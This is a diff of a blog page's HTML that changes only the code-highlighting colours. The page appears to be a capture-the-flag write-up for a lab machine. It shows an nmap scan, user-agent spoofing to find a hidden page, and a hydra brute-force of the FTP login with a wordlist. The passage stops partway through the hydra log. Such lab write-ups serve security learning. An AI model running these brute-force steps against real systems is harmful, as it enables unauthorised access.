@@ -24,290 +24,290 @@ Methodology We begin our enumeration efforts by running an nmap scan on the targ
 <p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
 <h2 id="methodology">Methodology</h2>
 <p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I start with the <code>-V</code>, <code>-C</code>, and <code>-T4</code> flags.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#177500"># Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253</span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#a90d91">for</span> 10.10.166.253
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#000">(</span>0.13s latency<span style="color:#000">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#1c01ce">997</span> closed tcp ports <span style="color:#000">(</span>reset<span style="color:#000">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#6272a4"># Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.10.166.253
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff79c6">(</span>0.13s latency<span style="color:#ff79c6">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#bd93f9">997</span> closed tcp ports <span style="color:#ff79c6">(</span>reset<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
 </span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
-</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#000">(</span>Ubuntu Linux; protocol 2.0<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>| ssh-hostkey: 
-</span></span><span style="display:flex;"><span>|   <span style="color:#1c01ce">2048</span> ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span style="color:#000">(</span>RSA<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>|   <span style="color:#1c01ce">256</span> 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span style="color:#000">(</span>ECDSA<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#1c01ce">256</span> 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span style="color:#000">(</span>ED25519<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#000">((</span>Ubuntu<span style="color:#000">))</span>
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#000">(</span>Ubuntu<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">2048</span> ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#bd93f9">256</span> 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#bd93f9">256</span> 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>|_http-title: Annoucement
 </span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span><span style="color:#177500"># Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds</span>
 </span></span></code></pre></div><p>Now we know that the target is running <code>vsftpd 3.0.3</code> on <code>port 21</code>, <code>OpenSSH 7.6p1</code> on <code>port 22</code>, and an <code>Apache httpd 2.4.29</code> web server on <code>port 80</code> with the <code>http-title</code> of <code>announcement</code> - all open to <code>tcp</code> traffic.</p>
 <p>Next, we visit the web server in a web browser.</p>
 <p><code>/index.html</code></p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#633820">&lt;!DocType html&gt;</span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#000">html</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#000">head</span>&gt;
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#000">title</span>&gt;Annoucement&lt;/<span style="color:#000">title</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000">head</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;!DocType html&gt;</span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">head</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#ff79c6">title</span>&gt;Annoucement&lt;/<span style="color:#ff79c6">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">head</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#000">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#000">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">p</span>&gt;
 </span></span><span style="display:flex;"><span>	Dear agents,
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#000">br</span>&gt;&lt;<span style="color:#000">br</span>&gt;
-</span></span><span style="display:flex;"><span>	Use your own &lt;<span style="color:#000">b</span>&gt;codename&lt;/<span style="color:#000">b</span>&gt; as user-agent to access the site.
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#000">br</span>&gt;&lt;<span style="color:#000">br</span>&gt;
-</span></span><span style="display:flex;"><span>	From,&lt;<span style="color:#000">br</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
+</span></span><span style="display:flex;"><span>	Use your own &lt;<span style="color:#ff79c6">b</span>&gt;codename&lt;/<span style="color:#ff79c6">b</span>&gt; as user-agent to access the site.
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
+</span></span><span style="display:flex;"><span>	From,&lt;<span style="color:#ff79c6">br</span>&gt;
 </span></span><span style="display:flex;"><span>	Agent R
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000">p</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">html</span>&gt;
 </span></span></code></pre></div><p>We&rsquo;re greeted with a message from Agent R, instructing other agents to change their <code>user-agent</code> to thier codename for site access. Here I used <a href="https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/">User-Agent Switcher</a> to alter my requests. I began by trying to log in as the boss, chaning my user agent to &ldquo;R&rdquo;. Unfortunately, we&rsquo;re given a hostile response by the administrator (presumably R himself) for this request:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#000">head</span>&gt;   
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000">head</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#000">body</span>&gt;What are you doing! Are you one of the 25 employees? If not, I going to report this incident
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">head</span>&gt;   
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">body</span>&gt;What are you doing! Are you one of the 25 employees? If not, I going to report this incident
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#000">title</span>&gt;Annoucement&lt;/<span style="color:#000">title</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#ff79c6">title</span>&gt;Annoucement&lt;/<span style="color:#ff79c6">title</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#000">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">p</span>&gt;
 </span></span><span style="display:flex;"><span>	Dear agents,
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#000">br</span>&gt;&lt;<span style="color:#000">br</span>&gt;
-</span></span><span style="display:flex;"><span>	Use your own &lt;<span style="color:#000">b</span>&gt;codename&lt;/<span style="color:#000">b</span>&gt; as user-agent to access the site.
-</span></span><span style="display:flex;"><span>	&lt;<span style="color:#000">br</span>&gt;&lt;<span style="color:#000">br</span>&gt;
-</span></span><span style="display:flex;"><span>	From,&lt;<span style="color:#000">br</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
+</span></span><span style="display:flex;"><span>	Use your own &lt;<span style="color:#ff79c6">b</span>&gt;codename&lt;/<span style="color:#ff79c6">b</span>&gt; as user-agent to access the site.
+</span></span><span style="display:flex;"><span>	&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
+</span></span><span style="display:flex;"><span>	From,&lt;<span style="color:#ff79c6">br</span>&gt;
 </span></span><span style="display:flex;"><span>	Agent R
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000">p</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">p</span>&gt;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#000">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">body</span>&gt;
 </span></span></code></pre></div><p>Likewise, user-agents <code>A</code> and <code>B</code> do not work, but <code>C</code> redirects us to <code>/agent_C_attention.php</code> on the web site:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Attention ----s, &lt;<span style="color:#000">br</span>&gt;&lt;<span style="color:#000">br</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>Attention ----s, &lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! &lt;<span style="color:#000">br</span>&gt;&lt;<span style="color:#000">br</span>&gt;
+</span></span><span style="display:flex;"><span>Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! &lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>From,&lt;<span style="color:#000">br</span>&gt;
+</span></span><span style="display:flex;"><span>From,&lt;<span style="color:#ff79c6">br</span>&gt;
 </span></span><span style="display:flex;"><span>Agent R
 </span></span></code></pre></div><p>Out of curiosity, I tried <code>J</code> as a user-agent, but that did not yield anything. However, now that we know about a user named <code>----s</code>, we should see if we can access the vsftpd FTP server on port 21. I chose to use <code>hydra</code> to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#000">(</span>virtualtack㉿kali-bot<span style="color:#000">)</span>-<span style="color:#000">[</span>~/thm/agent-sudo<span style="color:#000">]</span>
-</span></span><span style="display:flex;"><span>└─$ hydra -t <span style="color:#1c01ce">1</span> -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
-</span></span><span style="display:flex;"><span>Hydra v9.3 <span style="color:#000">(</span>c<span style="color:#000">)</span> <span style="color:#1c01ce">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#a90d91">do</span> not use in military or secret service organizations, or <span style="color:#a90d91">for</span> illegal purposes <span style="color:#000">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#000">)</span>.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff79c6">(</span>virtualtack㉿kali-bot<span style="color:#ff79c6">)</span>-<span style="color:#ff79c6">[</span>~/thm/agent-sudo<span style="color:#ff79c6">]</span>
+</span></span><span style="display:flex;"><span>└─$ hydra -t <span style="color:#bd93f9">1</span> -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
+</span></span><span style="display:flex;"><span>Hydra v9.3 <span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2022</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#ff79c6">do</span> not use in military or secret service organizations, or <span style="color:#ff79c6">for</span> illegal purposes <span style="color:#ff79c6">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#ff79c6">)</span>.
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Hydra <span style="color:#000">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#000">)</span> starting at 2022-05-23 10:19:49
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>DATA<span style="color:#000">]</span> max <span style="color:#1c01ce">1</span> task per <span style="color:#1c01ce">1</span> server, overall <span style="color:#1c01ce">1</span> task, <span style="color:#1c01ce">14344399</span> login tries <span style="color:#000">(</span>l:1/p:14344399<span style="color:#000">)</span>, ~14344399 tries per task
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>DATA<span style="color:#000">]</span> attacking ftp://10.10.73.189:21/
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>VERBOSE<span style="color:#000">]</span> Resolving addresses ... <span style="color:#000">[</span>VERBOSE<span style="color:#000">]</span> resolving <span style="color:#a90d91">done</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;123456&#34;</span> - <span style="color:#1c01ce">1</span> of <span style="color:#1c01ce">14344399</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/0<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;12345&#34;</span> - <span style="color:#1c01ce">2</span> of <span style="color:#1c01ce">14344400</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/1<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>STATUS<span style="color:#000">]</span> 2.00 tries/min, <span style="color:#1c01ce">2</span> tries in 00:01h, <span style="color:#1c01ce">14344398</span> to <span style="color:#a90d91">do</span> in 119536:40h, <span style="color:#1c01ce">1</span> active
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;123456789&#34;</span> - <span style="color:#1c01ce">3</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;password&#34;</span> - <span style="color:#1c01ce">4</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;iloveyou&#34;</span> - <span style="color:#1c01ce">5</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;princess&#34;</span> - <span style="color:#1c01ce">6</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;1234567&#34;</span> - <span style="color:#1c01ce">7</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#ff79c6">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#ff79c6">)</span> starting at 2022-05-23 10:19:49
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>DATA<span style="color:#ff79c6">]</span> max <span style="color:#bd93f9">1</span> task per <span style="color:#bd93f9">1</span> server, overall <span style="color:#bd93f9">1</span> task, <span style="color:#bd93f9">14344399</span> login tries <span style="color:#ff79c6">(</span>l:1/p:14344399<span style="color:#ff79c6">)</span>, ~14344399 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>DATA<span style="color:#ff79c6">]</span> attacking ftp://10.10.73.189:21/
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>VERBOSE<span style="color:#ff79c6">]</span> Resolving addresses ... <span style="color:#ff79c6">[</span>VERBOSE<span style="color:#ff79c6">]</span> resolving <span style="color:#ff79c6">done</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;123456&#34;</span> - <span style="color:#bd93f9">1</span> of <span style="color:#bd93f9">14344399</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/0<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;12345&#34;</span> - <span style="color:#bd93f9">2</span> of <span style="color:#bd93f9">14344400</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/1<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>STATUS<span style="color:#ff79c6">]</span> 2.00 tries/min, <span style="color:#bd93f9">2</span> tries in 00:01h, <span style="color:#bd93f9">14344398</span> to <span style="color:#ff79c6">do</span> in 119536:40h, <span style="color:#bd93f9">1</span> active
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;123456789&#34;</span> - <span style="color:#bd93f9">3</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;password&#34;</span> - <span style="color:#bd93f9">4</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;iloveyou&#34;</span> - <span style="color:#bd93f9">5</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;princess&#34;</span> - <span style="color:#bd93f9">6</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;1234567&#34;</span> - <span style="color:#bd93f9">7</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>... 🕒 two hours later 🕒 ...
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;cutie&#34;</span> - <span style="color:#1c01ce">243</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;james&#34;</span> - <span style="color:#1c01ce">244</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;banana&#34;</span> - <span style="color:#1c01ce">245</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;prince&#34;</span> - <span style="color:#1c01ce">246</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>STATUS<span style="color:#000">]</span> 7.94 tries/min, <span style="color:#1c01ce">246</span> tries in 00:31h, <span style="color:#1c01ce">14344155</span> to <span style="color:#a90d91">do</span> in 30126:37h, <span style="color:#1c01ce">1</span> active
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;friend&#34;</span> - <span style="color:#1c01ce">247</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;jesus1&#34;</span> - <span style="color:#1c01ce">248</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>ATTEMPT<span style="color:#000">]</span> target 10.10.73.189 - login <span style="color:#c41a16">&#34;----s&#34;</span> - pass <span style="color:#c41a16">&#34;------l&#34;</span> - <span style="color:#1c01ce">249</span> of <span style="color:#1c01ce">14344401</span> <span style="color:#000">[</span>child 0<span style="color:#000">]</span> <span style="color:#000">(</span>0/2<span style="color:#000">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>21<span style="color:#000">][</span>ftp<span style="color:#000">]</span> host: 10.10.73.189   login: ----s   password: ------l
-</span></span><span style="display:flex;"><span><span style="color:#000">[</span>STATUS<span style="color:#000">]</span> attack finished <span style="color:#a90d91">for</span> 10.10.73.189 <span style="color:#000">(</span>waiting <span style="color:#a90d91">for</span> children to <span style="color:#a90d91">complete</span> tests<span style="color:#000">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;cutie&#34;</span> - <span style="color:#bd93f9">243</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>ATTEMPT<span style="color:#ff79c6">]</span> target 10.10.73.189 - login <span style="color:#f1fa8c">&#34;----s&#34;</span> - pass <span style="color:#f1fa8c">&#34;james&#34;</span> - <span style="color:#bd93f9">244</span> of <span style="color:#bd93f9">14344401</span> <span style="color:#ff79c6">[</span>child 0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>0/2<span style="color:#ff79c6">)</span>
